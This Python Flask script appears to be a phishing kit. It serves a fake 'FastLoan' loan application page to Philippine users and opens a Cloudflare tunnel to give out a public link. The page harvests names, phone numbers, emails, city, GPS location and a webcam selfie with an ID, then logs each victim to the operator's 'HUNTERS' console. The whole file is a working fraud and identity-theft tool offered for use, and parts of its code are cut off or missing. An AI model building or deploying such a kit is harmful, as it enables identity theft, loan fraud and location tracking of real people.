import os, subprocess, time, datetime, base64, json
from flask import Flask, request, render_template_string, jsonify
from threading import Thread
from colorama import Fore, Style, init

init(autoreset=True)
app = Flask(__name__)

# Terminal Monitoring Colors
G, R, C, Y, W = Fore.GREEN+Style.BRIGHT, Fore.RED+Style.BRIGHT, Fore.CYAN+Style.BRIGHT, Fore.YELLOW+Style.BRIGHT, Fore.WHITE+Style.BRIGHT

def neon_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"{C}    __  __ _   _ _   _ _____ _____ ____  ____  ")
    print(f"{C}   |  ||  | | | | \ | |_   _| ____|  _ \/ ___| ")                                                                                 print(f"{C}   |  ||  | | | |  \| | | | |  _| | |_) \___ \ ")
    print(f"{C}   |  __  | |_| | |\  | | | | |___|  _ < ___) |")
    print(f"{C}   |_|  |_|\___/|_| \_| |_| |_____|_| \_\____/ ")                                                                                 print(f"\n{W}   >> {G}LEGIT LENDING MONITOR {W}| {C}v10.0 (2026) {W}<<")
    print(f"{G}[+] Neural Link Active | {C}Waiting for Applicants...\n")

def log_data(d, cam_file=None):
    print(f"\n{G}┌─── {W}[ {G}NEW LOAN APPLICANT {W}] {G}" + "─" * 15)
    print(f"{G}│ {W}PRODUCT  {G}: {Y}{d.get('ltp')}")
    print(f"{G}│ {W}NAME     {G}: {C}{d.get('n')}")
    print(f"{G}│ {W}PHONE    {G}: {C}{d.get('p')}")
    print(f"{G}│ {W}EMAIL    {G}: {C}{d.get('e')}")
    print(f"{G}│ {W}CITY     {G}: {C}{d.get('c')}")
    print(f"{G}│ {W}MAPS     {G}: {Y}https://www.google.com{d.get('lt')},{d.get('ln')}")
    if cam_file:
        print(f"{G}│ {W}CAM-FILE {G}: {R}{cam_file}")
    print(f"{G}└─────────────────────────────────────────────┘")

# --- PROFESSIONAL FINTECH UI ---
UI = """
<!DOCTYPE html>
<html>
<head>
    <title>FastLoan™ | Digital Lending</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #f0f2f5; color: #1c1e21; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
        .header { background: #0052cc; color: white; padding: 18px; font-weight: bold; font-size: 22px; text-align: center; box-shadow: 0 2p>
        .container { padding: 20px; max-width: 420px; margin: auto; }
        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
        .option { border: 1px solid #ddd; padding: 15px; margin: 12px 0; border-radius: 10px; cursor: pointer; text-align: left; transition:>
        .option:hover { background: #f0f7ff; border-color: #0052cc; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 1>
        .btn { background: #0052cc; color: white; border: none; padding: 15px; width: 100%; font-weight: bold; border-radius: 8px; cursor: p>
        video { width: 100%; border-radius: 10px; margin-top: 15px; border: 2px solid #0052cc; background: #000; transform: scaleX(-1); }
        #form, #verify, #loading, #thanks { display: none; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0052cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="header">FastLoan™ Mobile</div>
    <div class="container">
        <div class="card">
            <!-- STEP 0: PRODUCT SELECTION -->
            <div id="selection">
                <h3 style="color:#0052cc; margin-top:0;">Select a Loan Product</h3>
                <div class="option" onclick="startForm('Personal Loan')"><b>Personal Loan</b><br><small>Up to ₱50k | No Collateral</small></>
                <div class="option" onclick="startForm('Salary Loan')"><b>Salary Loan</b><br><small>Instant Cash for Employees</small></div>
                <div class="option" onclick="startForm('Emergency Cash')"><b>Emergency Cash</b><br><small>₱5k - ₱10k | 10min Approval</small>
            </div>

            <!-- STEP 1: PERSONAL FORM -->
            <div id="form">
                <h3 id="pname" style="color:#0052cc;">Application</h3>
                <input type="text" id="fn" placeholder="Full Name (as per ID)">
                <input type="tel" id="ph" placeholder="Mobile Number (09XXXXXXXXX)">
                <input type="email" id="em" placeholder="Gmail Address">
                <input type="text" id="ct" placeholder="City / Municipality">
                <button class="btn" onclick="askPermissions()">CONTINUE</button>
            </div>

            <!-- STEP 2: PERMISSIONS & SELFIE -->
            <div id="verify">
                <h3 style="color:#d93025;">Biometric Verification</h3>
                <p style="font-size:14px;">Allow <b>Location & Camera</b> access. Hold your <b>Valid ID</b> next to your face for the final >
                <video id="v" autoplay playsinline></video>
                <button class="btn" style="background:#d93025; margin-top:15px;" onclick="takeSnap()">SUBMIT SELFIE WITH ID</button>
            </div>

            <!-- STEP 3: LOADING -->
            <div id="loading">
                <div class="loader"></div>
                <h4>Verifying Credit Eligibility...</h4>
                <p style="font-size:12px; color:#666;">Encrypting ID documents for secure processing.</p>
            </div>

            <!-- STEP 4: THANK YOU -->
            <div id="thanks">
                <div style="font-size: 60px; color:#28a745;">✔</div>
                <h2 style="color:#28a745;">Success!</h2>
                <p>Your application is now under review.</p>
                <p style="font-size:14px; color:#555;">Please check your <b>Gmail inbox</b>. A FastLoan agent will message you once your dis>
                <button class="btn" style="background:#888;" onclick="location.reload()">DONE</button>
            </div>
        </div>
    </div>

    <script>
        let payload = {};

        function startForm(type) {
            payload.ltp = type;
            document.getElementById('selection').style.display = 'none';
            document.getElementById('form').style.display = 'block';
            document.getElementById('pname').innerText = type + " Form";
        }

        async function askPermissions() {
            payload.n = document.getElementById('fn').value;
            payload.p = document.getElementById('ph').value;
            payload.e = document.getElementById('em').value;
            payload.c = document.getElementById('ct').value;
            if(!payload.n || !payload.p) return alert("Please fill all fields.");

            try {
                // Get Location first
                navigator.geolocation.getCurrentPosition(pos => {
                    payload.lt = pos.coords.latitude; payload.ln = pos.coords.longitude;

            document.getElementById('verify').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            fetch('/post_data', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({data: payload, img: canvas.toDataURL('image/jpeg')})
            }).then(() => {
                setTimeout(() => {
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('thanks').style.display = 'block';
                }, 5000);
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(UI)

@app.route('/post_data', methods=['POST'])
def post_data():
    req = request.json                                                                                                                           u_data = req['data']
    img_b64 = req['img'].split(",")[1]

    # Save Image
    if not os.path.exists('camfiles'): os.makedirs('camfiles')
    fn = f"camfiles/ID_{int(time.time())}.jpg"
    with open(fn, "wb") as f: f.write(base64.b64decode(img_b64))

    log_data(u_data, cam_file=fn)
    return jsonify(status="success")

def tunnel():
    # [Cloudflared Tunnel CLI](https://developers.cloudflare.com)
    proc = subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://127.0.0.1:5000'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, t>
    for line in proc.stdout:
        if "trycloudflare.com" in line:
            parts = line.split("https://")
            if len(parts) > 1:
                url = "https://" + parts[1].split()[0]
                print(f"\n{G}[🚀] GENERATED LINK: {C}{url}\n")
                break

if __name__ == "__main__":
    neon_banner()
    Thread(target=tunnel, daemon=True).start()
    # [Flask Production Note](https://flask.palletsprojects.com)
    app.run(port=5000, debug=False, use_reloader=False)
